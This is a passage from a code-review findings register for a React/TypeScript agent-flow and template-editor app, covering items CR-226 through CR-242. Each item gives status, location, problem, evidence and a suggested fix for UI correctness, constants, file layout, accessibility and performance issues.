- **Evidence:**
  ```ts
  async getMRChanges(projectPath: string, mrIid: number) {
    return this.api(`/projects/${projectPath}/merge_requests/${mrIid}/changes`);
  }
  ```
- **Suggested fix:** Switch to the paginated `/merge_requests/:iid/diffs` (with the DATA-06 (CR-098) helper). Surface a `truncated` flag on the port result so the review node can warn.
- **Effort:** S

### CR-226 [Low] `useNodePrompt` shows the previous node's prompt as placeholder data after a node switch

- **Status at `abaa007`:** **Fixed**
- **Re-verification note:** `useNodePrompt` (hooks/use-flow-chat.ts:39-48) no longer sets `placeholderData: keepPreviousData`, so switching nodes shows the new node's loading state instead of the previous node's prompt.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-18
- **Location:** `hooks/use-flow-chat.ts:39-54`, `components/chat/ChatPanel.tsx:85-89,102-116`
- **Problem:** `placeholderData: keepPreviousData` on a key that includes `nodeKey` means that switching between two prompt-pending nodes renders node A's prompt (and char count) in node B's preview box until B loads. `isPlaceholderData` is never checked, so nothing marks it as stale.
- **Evidence:**
  ```ts
  queryKey: queryKeys.flows.nodePrompt(flowId, nodeKey),
  ...
  placeholderData: keepPreviousData,
  ```
- **Suggested fix:** Drop `keepPreviousData` here, since the identity changes per node, so B shows its own loading state. Alternatively, treat `isPlaceholderData` as loading in `NodePromptBox`.
- **Effort:** S

### CR-227 [Low] Index-based React keys remount rows: run sections lose expand state, and draft rows shift focus

- **Status at `abaa007`:** **Fixed** (Task 36)
- **Current location:** components/chat/ChatFeed.tsx:72-83; components/chat/RunSectionRow.tsx:61-63; components/flows/components/plan/components/planSteps/PlanSteps.tsx:136-144
- **Re-verification note:** Run-section keys are still index-qualified (`r${section.key}#${i}`), feed items still use `key={i}`, and plan-step drafts still use `key={i}` with remove-by-index. Rows therefore remount and lose expand state when earlier rows shift. Fix: key sections by a stable identity (section key plus first event id), feed items by event or tool id, and drafts by a client id created in the draft factory.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-19
- **Location:** `components/chat/ChatFeed.tsx:77-85`, `components/chat/RunSectionRow.tsx:70-71`, `components/flows/plan/PlanSteps.tsx:129-131`
- **Problem:** Run-section keys are `r${section.key}#${i}`, which includes the index. The index shifts whenever a row is inserted earlier, a finished section re-sorts (its sort key moves from start time to last-event time), or the 500-event buffer rolls the oldest rows off. When it shifts, every `RunSectionRow` remounts and loses the user's expanded or collapsed state, and the message scroller re-anchors. Feed items (`key={i}`) and plan-step drafts (`key={i}` with remove-by-index) have the same problem.
- **Evidence:**
  ```tsx
  : row.kind === "run"
    ? `r${row.section.key}#${i}`
  ```
- **Suggested fix:** Key sections by a stable identity, for example `section.key` plus the first event id of the section (de-duplicated in `eventGrouper`). Key feed items by event or tool id. Give drafts a client id (`crypto.randomUUID()` in `emptyDraft`/`toDraft`).
- **Effort:** S

### CR-228 [Low] Domain strings (actions, node kinds/types, event types, merge statuses, modes) hardcoded instead of constants

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
- **Current location:** components/flows/panels/AgentView.tsx:57,62; DecisionView.tsx:61; ScriptView.tsx:41; HttpView.tsx:38; StartView.tsx:47; FanoutStepList.tsx:21,120,136,143,149,157; BuildView.tsx:54,64; FlowHeader.tsx:57; StatusBar.tsx:9,70; DeclarativeView.tsx:20; GraphEdges.tsx:46; components/chat/EventRow.tsx:18; components/chat/FlowEventRow.tsx:20; components/chat/RunSectionRow.tsx:73
- **Re-verification note:** `FLOW_STATUS`/`STATUS_VARIANT` are now used in the panels, and `EXECUTION_MODE_LOCAL` is used in FlowColumns, FlowsView and NodePanel. `FLOW_ACTION` exists but has only `RUN_NODE` and is used nowhere. Panels still type `"approve_node"`, `"run_node"`, `"*_fanout_step"`, `"mr_failed"`, `"lifecycle"`, `"conflict"`, `"decision"` and `"local"` (FlowHeader, StatusBar) inline. Fix: complete `FLOW_ACTION`, add `FLOW_EVENT_TYPE`/`MERGE_STATUS`/`NODE_KIND`, use them, and reuse `EXECUTION_MODE_LOCAL`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-20
- **Location:**
  - action names: `components/flows/panels/AgentView.tsx:59,64,141`, `DecisionView.tsx:60,65`, `BuildView.tsx:63-64`, `FanoutStepList.tsx:143,149,157`, `ReviewView.tsx:101,105,167`, `PipelineView.tsx:37,64`, `ResolveView.tsx:37,63`, `StartView.tsx:47`, `PanelShell.tsx:69,80`, `hooks/use-flow-prompt.ts:215-217`
  - node kinds/types: `DeclarativeView.tsx:19-21,32`, `AgentView.tsx:155`, `GraphEdges.tsx:46`, `ReviewView.tsx:163`, `PipelineView.tsx:60`, `ResolveView.tsx:59`
  - event types: `BuildView.tsx:52,58`, `RunSectionRow.tsx:82`, `EventRow.tsx:21`, `FlowEventRow.tsx:20`
  - merge/step statuses: `FanoutStepList.tsx:16,20-26,120,136`, `cockpit/fanout-progress.ts:46,48`
  - execution mode: `FlowHeader.tsx:74`, `StatusBar.tsx:70`
  - comment status: `ReviewView.tsx:53,244`
  - node-key labels: `StatusBar.tsx:9-15`
  - status-keyed styles: `workflow-graph/graph-layout.ts:9-18`
- **Problem:** §2.7 requires domain values to come from named constants. The plan feature has `PLAN_ACTION`, but sibling panels type `"approve_node"`, `"run_node"`, `"mr_failed"`, `"conflict"` and `"local"` (while `EXECUTION_MODE_LOCAL` exists) inline. A typo silently becomes a 400 "unknown action" or a check that never matches.
- **Evidence:**
  ```tsx
  <Button onClick={() => action("approve_node", { nodeKey: node.node_key })}>
  if (e.type === "mr_failed") { ... }
  {flow.execution_mode === "local" ? (
  ```
- **Suggested fix:**
  1. Add `FLOW_ACTION`, `NODE_KIND`, `FLOW_EVENT_TYPE`, `MERGE_STATUS` and `COMMENT_STATUS` as `as const` objects in `constants/flow.ts`, which also gives derived types for the action route.
  2. Replace the literals with these constants, and reuse `EXECUTION_MODE_LOCAL`.
  3. Key `STATUS`/`NODE_LABELS` by `FLOW_STATUS.*`.
- **Effort:** M

### CR-229 [Low] Single-consumer hooks live in shared `hooks/` instead of their feature folders

- **Status at `abaa007`:** **Open**, fix in [Task 54](review-tasks/54-feature-layout-and-naming.md)
- **Current location:** hooks/use-agent-status.ts; hooks/use-artifact-fetcher.ts; hooks/use-flow-comments.ts; hooks/use-graph-def.ts; hooks/use-model-catalog.ts; hooks/use-flow-prompt.ts
- **Re-verification note:** These six hooks still each have exactly one consuming feature (flows: agent-status, artifact-fetcher, flow-comments, graph-def; chat: model-catalog, flow-prompt). `use-flow-chat` now has consumers in both chat and the flows plan feature, so it legitimately stays shared. Fix: move the six into `components/flows/hooks/` and `components/chat/hooks/`, renaming to the camelCase `useThing.ts` convention that AGENTS.md §2.9 now requires.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-21
- **Related:** CR-161 (FLOWUI-16, UI-27, TOOL-08)
- **Location:**
  - used only by flows: `hooks/use-agent-status.ts`, `hooks/use-artifact-fetcher.ts`, `hooks/use-flow-comments.ts`, `hooks/use-graph-def.ts`
  - used only by chat: `hooks/use-model-catalog.ts`, `hooks/use-flow-prompt.ts`, `hooks/use-flow-chat.ts`
- **Problem:** §2.3 says feature-local helpers stay in the feature folder until a second consumer exists. Each of these has exactly one consuming feature (verified by grep). The settings area reaches the model catalog through the `useModels` re-export from the chat barrel. Keeping them in `hooks/` widens the shared surface and lets them escape feature lint rules (see FLOWUI-16 (CR-161)).
- **Evidence:**
  ```
  use-graph-def  -> components/flows/workflow-graph/* only
  use-flow-prompt -> components/chat/prompt-modal/* only
  ```
- **Suggested fix:** Move them to `components/flows/hooks/` and `components/chat/hooks/` respectively, keeping `fetch-json.ts` shared. Export through the feature barrel only what another feature needs, such as `useModelCatalog`.
- **Effort:** M

### CR-230 [Low] Oversized files and multiple exported components per file

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 54](review-tasks/54-feature-layout-and-naming.md)
- **Current location:** components/flows/panels/ReviewView.tsx:38,66,177,196,229 (248 lines); components/flows/FlowStatus.tsx:9-77; components/flows/panels/ArtifactViews.tsx:19,49,102; components/chat/ModelSelector.tsx:25-28; components/chat/prompt-modal/PromptModal.tsx (205 lines)
- **Re-verification note:** PlanView (100 lines), FlowCockpit (115) and use-flow-prompt (186) have been split down. Still open: ReviewView mixes `buildThreads` with three internal components, FlowStatus exports five items, ArtifactViews exports three components, and ModelSelector still exports the `useModels` hook. PromptModal is borderline at 205 lines. Fix: extract `buildThreads` and the thread components, split FlowStatus and ArtifactViews one component per file, and move `useModels` into the hook module.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-22
- **Location:** `components/chat/prompt-modal/PromptModal.tsx` (267 lines), `hooks/use-flow-prompt.ts` (260), `components/flows/panels/ReviewView.tsx` (251, four components plus threading logic), `components/flows/plan/PlanView.tsx` (217), `components/flows/cockpit/FlowCockpit.tsx` (213). Multiple exported components: `components/flows/FlowStatus.tsx:9-77` (`statusStyle`, `StatusBadge`, `WorktreeBadge`, `EMPTY_CELL`, `FlowStatusDot`), `components/flows/panels/ArtifactViews.tsx:18-85`, `components/chat/ModelSelector.tsx:25-27` (exports the `useModels` hook from a component file)
- **Problem:** These files are past the §2.2 refactor signal (~200 lines or more than one exported component). ReviewView mixes data, threading (`buildThreads`) and three presentational components. FlowCockpit holds selection, model, plan-options and action logic inline.
- **Evidence:**
  ```
  267 components/chat/prompt-modal/PromptModal.tsx
  251 components/flows/panels/ReviewView.tsx
  ```
- **Suggested fix:**
  - Move `buildThreads` to `review-threads.ts`, and `ThreadCard`/`NoteHeader`/`ThreadListSkeleton` to their own files.
  - Extract `useCockpitSelection` and `useFlowAction` from FlowCockpit, and the run handlers from PlanView into a `usePlanRuns` hook.
  - Split FlowStatus and ArtifactViews one component per file.
  - Move `useModels` to the hook module.
- **Effort:** M

### CR-231 [Low] Empty-state markup duplicated instead of reusing `PanelEmptyState`; generic components not in `components/shared/`

- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
- **Current location:** components/flows/panels/AgentView.tsx:105-108; components/flows/panels/ArtifactViews.tsx:40-43; components/flows/panels/BuildView.tsx:194-197; components/flows/panels/ReviewView.tsx:131-134; components/flows/components/plan/components/PlanEmptyHint.tsx:9; components/flows/panels/PanelEmptyState.tsx; components/chat/ChatFeedError.tsx
- **Re-verification note:** Four panels (plus the new PlanEmptyHint) still hand-roll the icon-plus-muted-text empty block with drifting `py-10`/`py-16`, while HttpView, ScriptView and DecisionView use `PanelEmptyState`. `PanelEmptyState` and `ChatFeedError` are still in feature folders, not `components/shared/`. Fix: use `PanelEmptyState` everywhere and promote it (as `EmptyHint`) and a generic `InlineError` to `components/shared/`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-23
- **Location:** duplicates in `components/flows/panels/AgentView.tsx:106-110`, `ArtifactViews.tsx:41-44`, `BuildView.tsx:169-172`, `ReviewView.tsx:131-136`. Generic candidates: `components/flows/panels/PanelEmptyState.tsx`, `components/chat/TaskCollapsible.tsx`, `components/chat/ChatFeedError.tsx`
- **Problem:** Four panels hand-roll the same "big icon + muted line" block that `PanelEmptyState` already provides, with drifting paddings (`py-10` vs `py-16`). `PanelEmptyState` (icon plus children) and `ChatFeedError` (message plus retry) pass the §2.4 litmus test for generic components but live in feature folders.
- **Evidence:**
  ```tsx
  <div className="text-center px-5 py-10">
    <GitMerge size={32} className="text-muted-foreground mb-3 mx-auto" />
    <p className="text-muted-foreground max-w-[380px] mx-auto">No changes yet.</p>
  ```
- **Suggested fix:** Replace the inline blocks with `<PanelEmptyState icon={…}>`. Promote `PanelEmptyState` (renamed `EmptyHint`) and a generic `InlineError` (message plus retry) to `components/shared/` and export them via its barrel.
- **Effort:** S

### CR-232 [Low] Duplicated types and transport helpers drift from their sources

- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
- **Current location:** components/flows/workflow-graph/NodeCard.tsx:11-17; components/flows/cockpit/fanout-progress.ts:20-26; components/flows/panels/ReviewView.tsx:17-22; hooks/use-flow-comments.ts:8-19; hooks/use-flow-prompt.ts:53-57,138-151; components/flows/panels/CostChip.tsx:19-31
- **Re-verification note:** `FanoutProgress` is still defined twice, and ReviewView still re-declares `Comment` instead of importing `MrComment`. `use-flow-prompt` still hand-rolls `fetch` (the `fetchPromptData` path throws a bare `HTTP <status>` and drops the server's `{ error }`). CostChip still duplicates `fmtDuration`/`fmtTokens` from `lib/format.ts` as `fmtDur`/`fmtTok`. Fix: import the single sources, and use `fetchJson`/`postJson`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-24
- **Related:** CR-155 (UI-13)
- **Location:** `components/flows/workflow-graph/NodeCard.tsx:11-17` vs `components/flows/cockpit/fanout-progress.ts:20-26` (`FanoutProgress` defined twice); `components/flows/panels/ReviewView.tsx:19-23` vs `hooks/use-flow-comments.ts:8-19` (`Comment` vs `MrComment`); `hooks/use-flow-prompt.ts:69-73,211-223` (a hand-rolled `fetch` and error parsing duplicating `fetchJson`/`postJson`); `components/flows/panels/CostChip.tsx:19-31` (duplicates of `fmtDuration`/`fmtTokens`)
- **Problem:** These are parallel definitions of the same contract. `fetchPromptData` throws `HTTP 500` and drops the server's `{ error }` message that `fetchJson` would surface. A field change in one `FanoutProgress` or `MrComment` won't fail type-checks in the other.
- **Evidence:**
  ```ts
  async function fetchPromptData(url: string): Promise<PromptData> {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
  ```
- **Suggested fix:** Import `FanoutProgress` from `fanout-progress.ts` in NodeCard. Use `MrComment` in ReviewView. Use `fetchJson`/`postJson` in `use-flow-prompt`. Use `lib/format` helpers in CostChip.
- **Effort:** S

### CR-233 [Low] WorkflowGraph re-runs the dagre layout on every render (every poll and selection click)

- **Status at `abaa007`:** **Fixed** (Task 36)
- **Current location:** components/flows/workflow-graph/WorkflowGraph.tsx:37-58; components/flows/workflow-graph/graph-layout.ts:34-37; components/flows/workflow-graph/GraphEdges.tsx:51-52,84,92
- **Re-verification note:** `layout(keys, edges)` still rebuilds the dagre graph on every render (every poll and selection click), `keys.includes` inside the edge loop is O(n²), and `specOf` does a linear `find` per edge, twice. React Compiler is not enabled. Fix: `useMemo` the layout on a stable signature placed before the early returns (hooks order), use a `Set` for keys, and pre-index `edgeSpecs`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-25
- **Location:** `components/flows/workflow-graph/WorkflowGraph.tsx:38-44`, `components/flows/workflow-graph/graph-layout.ts:34-37`
- **Problem:** `layout(keys, edges)` builds a fresh dagre graph on each render. That includes every 3 s flow-detail refetch triggered by events and every node click, even though node keys and edges rarely change. `keys.includes` inside the edge loop is O(n²). `GraphEdges` also does a linear `specOf` search per edge, twice.
- **Evidence:**
  ```tsx
  const keys = nodes.map((n) => n.node_key);
  const edges = graphDef?.edges ?? [];
  if (!keys.length) return null;
  const g = layout(keys, edges);
  ```
- **Suggested fix:** Memoize on a stable signature, for example `useMemo(() => layout(keys, edges), [keys.join("|"), edges])`, computed before the early return so hooks order stays valid. Use a `Set` for keys and pre-index `edgeSpecs` by `from>to`.
- **Effort:** S

### CR-234 [Low] Sub-flow navigation uses a raw `<a href>`, causing a full page reload and dropping the query cache

- **Status at `abaa007`:** **Fixed** (Task 36)
- **Current location:** components/flows/panels/FanoutStepList.tsx:161-169
- **Re-verification note:** "Open sub-flow" is still a raw `<a href>` to an internal route, so each click does a full reload and drops the TanStack cache. Fix: use `next/link` (`<Link href=…>` or `Button render={<Link/>}` as FlowHeader does).

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-26
- **Location:** `components/flows/panels/FanoutStepList.tsx:162-168`
- **Problem:** "Open sub-flow" is an internal route, but it uses `<a href>`, unlike `StatusBar`/`FlowHeader`, which use `next/link`. Each click reloads the app: the TanStack cache (model catalog, graph defs) is lost and the shell re-hydrates.
- **Evidence:**
  ```tsx
  <a href={`/flows/${s.sub_flow.id}`} className="inline-flex items-center gap-1 ...">
    <ExternalLink size={12} /> Open sub-flow
  </a>
  ```
- **Suggested fix:** Use `<Link href={`/flows/${id}`}>`, or `Button render={<Link …/>}` as `FlowHeader` does.
- **Effort:** S

### CR-235 [Low] Cockpit selection reads a ref during render to decide what's shown

- **Status at `abaa007`:** **Fixed** (Task 35)
- **Current location:** components/flows/cockpit/FlowCockpit.tsx:52-58
- **Re-verification note:** `userSelected` ref is still read during render (`resolvedSelectedKey = userSelected.current ? selected : flow.current_node ?? ''`) and set inside `onSelect`. Derive `resolvedSelectedKey = selected || flow.current_node || ''`, drop the ref, and pass `setSelected` as `onSelect`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-27
- **Location:** `components/flows/cockpit/FlowCockpit.tsx:60-66`
- **Problem:** `resolvedSelectedKey` branches on `userSelected.current` during render. Reading mutable refs in render isn't reactive and breaks under concurrent rendering and React Compiler assumptions. The ref is redundant because `selected !== ""` already encodes "user picked".
- **Evidence:**
  ```tsx
  const userSelected = useRef(false);
  const [selected, setSelected] = useState("");
  const resolvedSelectedKey = userSelected.current ? selected : flow.current_node ?? "";
  ```
- **Suggested fix:** Derive it as `const resolvedSelectedKey = selected || flow.current_node || ""` and drop the ref, keeping `onSelect = setSelected`.
- **Effort:** S

### CR-236 [Low] Inline callbacks created inside `.map()` bodies

- **Status at `abaa007`:** **Partly fixed** (Task 36 — `FanoutStepList`/`DecisionView`; `StartView`, `BuildView`, `ArtifactViews`, `PlanApproveFooter`, `PromptEditorSection` unchanged)
- **Current location:** components/flows/panels/StartView.tsx:87, components/flows/panels/BuildView.tsx:165, components/flows/panels/DecisionView.tsx:94, components/flows/panels/FanoutStepList.tsx:116-172 (closures at 143,148,157), components/flows/panels/ArtifactViews.tsx:76, components/flows/components/plan/components/PlanApproveFooter.tsx:74, components/chat/prompt-modal/PromptEditorSection.tsx:35
- **Re-verification note:** Closures are still created inside `.map()` bodies; the plan footer moved to components/flows/components/plan/components/ but kept the pattern. FanoutStepList's ~55-line inline step card is the main target. Extract `FanoutStepCard` / `BranchMrRow` (and similar) rows that take primitives and a stable `(id) => void`, as `PlanStepItem` / `PlanStepDraftRow` already do.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-28
- **Location:** `components/flows/panels/StartView.tsx:86`, `components/flows/panels/BuildView.tsx:146`, `components/flows/panels/DecisionView.tsx:93`, `components/flows/panels/FanoutStepList.tsx:143,149,157`, `components/flows/panels/ArtifactViews.tsx:54`, `components/flows/plan/PlanApproveFooter.tsx:60`, `components/chat/prompt-modal/PromptEditorSection.tsx:35`
- **Problem:** §2.5 says never create a callback inside a `.map()` body. FanoutStepList's step card is about 50 lines of inline JSX per step with three closures, a natural row component. Since no child is memoized today the performance cost is small, but it blocks memoizing rows later. PlanStepItem and PlanStepDraftRow already follow the row-component-with-id-callback pattern.
- **Evidence:**
  ```tsx
  {fields.map((f) => (
    <StartFieldInput key={f.key} field={f} value={values[f.key]} onChange={(v) => setValue(f.key, v)} />
  ))}
  ```
- **Suggested fix:** Extract row components (`FanoutStepCard`, `BranchMrRow`) that take primitives plus a stable `(id) => void` callback, following the `PlanStepItem` pattern.
- **Effort:** S

### CR-237 [Low] Layout autosave shows "saved" on HTTP errors

- **Status at `abaa007`:** **Fixed** ([Task 15](review-tasks/15-frontend-mutation-conventions.md))
- **Current location:** components/template-editor/hooks/use-node-positions.ts:17,61-67
- **Re-verification note:** The positions PATCH still does `.then(() => setLayoutSync("saved"))` regardless of `res.ok`, and network errors fall back silently to "idle". Add an "error" `LayoutSync` state set when `!r.ok` or on catch, render it in `EditorHeader`, and preferably move the PATCH to a `useMutation`.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-22
- **Related:** CR-030 (TPL-02)
- **Location:** `components/template-editor/hooks/use-node-positions.ts:61-67`
- **Problem:** `.then(() => setLayoutSync("saved"))` runs for any HTTP status, including 400 "template not found" and 403/400 from `assertEditable`. Network failures quietly revert to `"idle"`, so the user is never told the layout wasn't saved.
- **Evidence:**
  ```ts
  fetch(`/api/templates/${templateId}`, { method: "PATCH", ... })
    .then(() => setLayoutSync("saved"))
    .catch(() => setLayoutSync("idle"));
  ```
- **Suggested fix:** Use `.then((r) => setLayoutSync(r.ok ? "saved" : "error"))` and render the error state in `EditorHeader`. Ideally make this a `useMutation`.
- **Effort:** S

### CR-238 [Low] Duplicated domain magic strings and kind unions

- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
- **Current location:** components/template-editor/components/BuilderFlow.tsx:32, components/template-editor/WebhookPayloadDialog.tsx:37, components/template-editor/hooks/use-palette-catalog.ts:15,20,64, components/template-editor/hooks/use-configurator-tabs.ts:26, components/template-editor/types.ts:162, components/template-editor/NodePalette.tsx:122, components/builder/hooks/use-editor-actions.ts:35,223,347, components/builder/EditorCanvas.tsx:46, components/template-editor/boilerplate.ts:12, components/templates/constants.ts:8,16, components/template-editor/components/ConfigTab.tsx:31, components/template-editor/DeclarativeConfigFields.tsx:97
- **Re-verification note:** `START_NODE_TEMPLATE_ID` is still redeclared locally in BuilderFlow and WebhookPayloadDialog, and `"nt_start"` is inlined twice more, even though draft.ts:32 exports it. `"nt_plan"`, `"start"` and `"decision"` are still raw literals, and the agent/decision/http/script union is declared four times (`DraftKind`, `AuthorKind`, `NodeTemplateKind`, the EditorCanvas inline union). The fanout key set is duplicated in ConfigTab and DeclarativeConfigFields. Add a shared `NODE_KIND` `as const` object, a `NodeKind` type and `BUILTIN_TEMPLATE_ID` constants, then import them everywhere.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 6 — Template authoring
- **Source:** TPL-24
- **Location:** `components/template-editor/components/BuilderFlow.tsx:32`, `components/template-editor/WebhookPayloadDialog.tsx:37`, `components/template-editor/hooks/use-palette-catalog.ts:15-23,64`, `components/template-editor/hooks/use-configurator-tabs.ts:24-29`, `components/template-editor/NodePalette.tsx:122`, `components/template-editor/types.ts:162`, `components/builder/hooks/use-editor-actions.ts:35,347`, `components/builder/EditorCanvas.tsx:46`, `components/template-editor/boilerplate.ts:12-14`, `components/templates/constants.ts`, `components/template-editor/ConfigTab.tsx` / `DeclarativeConfigFields.tsx:96` (`FANOUT_FIELD_KEYS`)
- **Problem:**
  - `"nt_start"` is redeclared locally three times, although `draft.ts:32` exports `START_NODE_TEMPLATE_ID`.
  - `"nt_plan"`, the catalog key `"start"` and `"decision"` appear as raw literals.
  - The author kind union `"agent" | "decision" | "http" | "script"` is declared six times (`DraftKind`, `AuthorKind`, `NodeTemplateKind`, the inline union in EditorCanvas, `KIND_LABELS`/`KIND_ICONS`, and `templates/constants.ts`, whose `KIND_ICONS` shares the name but has a different type).
  - `FANOUT_FIELD_KEYS` is duplicated.

  This violates §2.7.
- **Evidence:**
  ```ts
  // BuilderFlow.tsx:32 and WebhookPayloadDialog.tsx:37
  const START_NODE_TEMPLATE_ID = "nt_start";
  ```
- **Suggested fix:** Add `constants/node-kinds.ts` with `NODE_KIND` (`as const`) plus the derived `NodeKind` type and `BUILTIN_TEMPLATE_ID`, and import everywhere. Delete the local copies.
- **Effort:** S

### CR-239 [Low] Oversized files and files exporting multiple components

- **Status at `abaa007`:** **Open**, fix in [Task 54](review-tasks/54-feature-layout-and-naming.md)
- **Current location:** components/builder/hooks/use-editor-actions.ts (447 lines), components/template-editor/variables.ts (417), components/template-editor/WebhookPayloadDialog.tsx (403, no "use client"), components/builder/EditorPage.tsx (301), components/template-editor/types.ts (232), components/templates/TemplateGallery.tsx (231), components/template-editor/NodeConfigurator.tsx:25-26 (229), components/template-editor/ConfigFieldRow.tsx (211), components/builder/EditorNodeDrawer.tsx:138, components/builder/EditorEdgeDrawer.tsx:25, components/template-editor/components/EdgeKindField.tsx:13, components/template-editor/PromptSectionField.tsx:45
- **Re-verification note:** Every listed file still has the same line count. `SheetFooterHelper` is still a second export of EditorNodeDrawer and is consumed by EditorEdgeDrawer. NodeConfigurator still re-exports `SelectOption` and `StartContractEditor`, EdgeKindField imports `SelectOption` through it, and PromptSectionField re-exports `RulesListEditor`. Split use-editor-actions and WebhookPayloadDialog (and add "use client" to the dialog), move `SheetFooterHelper` to components/shared/, and replace the re-exports with direct imports.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 6 — Template authoring
- **Source:** TPL-25
- **Location:**
  - `components/builder/hooks/use-editor-actions.ts` (447)
  - `components/template-editor/variables.ts` (417)
  - `components/template-editor/WebhookPayloadDialog.tsx` (403)
  - `components/builder/EditorPage.tsx` (301)
  - `components/template-editor/types.ts` (232)
  - `components/templates/TemplateGallery.tsx` (231)
  - `components/template-editor/NodeConfigurator.tsx` (229)
  - `components/template-editor/ts-schema-lite.ts` (224)
  - `components/template-editor/hooks/use-template-draft.ts` (221)
  - `components/template-editor/components/StartContractEditor.tsx` (216)
  - `components/template-editor/components/ConfigFieldRow.tsx` (211)
  - `components/template-editor/components/BuilderFlow.tsx` (210)
  - `components/template-editor/components/TriggerTab.tsx` (210)
  - `components/template-editor/components/EditRow.tsx` (205)
- **Problem:** These files exceed the ~200-line refactor signal (§2.2). There are also multiple exported components:
  - `EditorNodeDrawer.tsx:138-144` exports `SheetFooterHelper`, which `EditorEdgeDrawer` imports.
  - `NodeConfigurator.tsx` re-exports `SelectOption` and `StartContractEditor` as a "monolith path", and `EdgeKindField` imports `SelectOption` from `../NodeConfigurator`.
  - `PromptSectionField` re-exports `RulesListEditor`.

  WebhookPayloadDialog also lacks `"use client"` despite using hooks; it works only because its importers are client components.
- **Evidence:**
  ```tsx
  // EditorNodeDrawer.tsx:137-138 (second exported component, imported by EditorEdgeDrawer)
  /** Small helper text for drawer footers (kept declarative). */
  export function SheetFooterHelper() {
  ```
- **Suggested fix:**
  - Split `use-editor-actions` into node, edge and catalog action hooks.
  - Split WebhookPayloadDialog into URL, sample-payload and filter sections, and add `"use client"`.
  - Move `SheetFooterHelper` to `components/shared/`.
  - Import `SelectOption` and `StartContractEditor` from their own files, and drop the re-exports.
- **Effort:** M

### CR-240 [Low] Accessibility gaps: div-click node card, icon-only buttons without labels, tabs without ARIA

- **Status at `abaa007`:** **Fixed** ([Task 38](review-tasks/38-editor-draft-machine.md))
- **Current location:** components/template-editor/components/BuilderNodeView.tsx:41-57, components/builder/EditorNotices.tsx:30-37, components/template-editor/NodeConfigurator.tsx:171-185
- **Re-verification note:** The node card is still a `div onClick` with no role, tabIndex or key handler. The notice dismiss button is icon-only with `title` but no `aria-label`. The configurator tabs are still plain buttons with no tablist/tab roles and no `aria-selected`. Add role="button", tabIndex and an Enter/Space handler (or use a button), add `aria-label`, and switch to the shadcn `Tabs` primitive or the new `components/shared/TabStrip`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 6 — Template authoring
- **Source:** TPL-26
- **Related:** CR-131 (FLOWUI-17)
- **Location:** `components/template-editor/components/BuilderNodeView.tsx:41-57`, `components/builder/EditorNotices.tsx:30-38`, `components/template-editor/NodeConfigurator.tsx:171-185`
- **Problem:**
  - The node card is a `div onClick` with no `role`, `tabIndex` or key handler, so the drawer can't be opened by keyboard.
  - The notice dismiss button is icon-only with `title` but no `aria-label`.
  - The configurator tabs are plain buttons with no `role="tablist"`/`"tab"`, `aria-selected` or arrow-key handling.
- **Evidence:**
  ```tsx
  <div
    // no stopPropagation: the click must reach React Flow's node wrapper ...
    onClick={() => onOpen(id)}
    className={cn(
  ```
- **Suggested fix:** Use a `button`, or add `role="button" tabIndex={0}` with an Enter/Space handler. Add `aria-label`s to icon buttons. Use the shadcn `Tabs` primitive.
- **Effort:** S

### CR-241 [Low] Prompt editor never syncs an externally changed value

- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
- **Current location:** components/template-editor/hooks/use-prompt-editor.ts:85-118, components/template-editor/PromptEditor.tsx:59
- **Re-verification note:** `useEditor` is still seeded once with `content: textToHtml(value)`, and nothing calls `setContent` when `value` changes from outside (the only effect only re-dispatches decorations). Add an effect that calls `editor.commands.setContent` when `value` differs from the last emitted text, or key `PromptEditor` by node and field.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-28
- **Location:** `components/template-editor/hooks/use-prompt-editor.ts:85-118`
- **Problem:** Tiptap's `useEditor` is seeded once from `value`. Later prop changes are never pushed into the editor (no `setContent` when the value differs from the editor's own output). Any external change to the body while the editor is mounted, such as an override being reset or the section switching, leaves stale text on screen, and the next keystroke writes that stale text back. Low, because undo and redo currently close the drawer.
- **Evidence:**
  ```ts
  content: textToHtml(value),   // read once by useEditor; no later setContent on prop change
  immediatelyRender: false,
  ```
- **Suggested fix:** Key the editor by node and field, or add an effect that calls `editor.commands.setContent` when `value !== lastEmitted.current`.
- **Effort:** S

### CR-242 [Low] Schedule interval input can't be cleared or retyped

- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
- **Current location:** components/template-editor/FlowSettings.tsx:113,118, components/template-editor/components/FlowSettingsSchedule.tsx:76-89
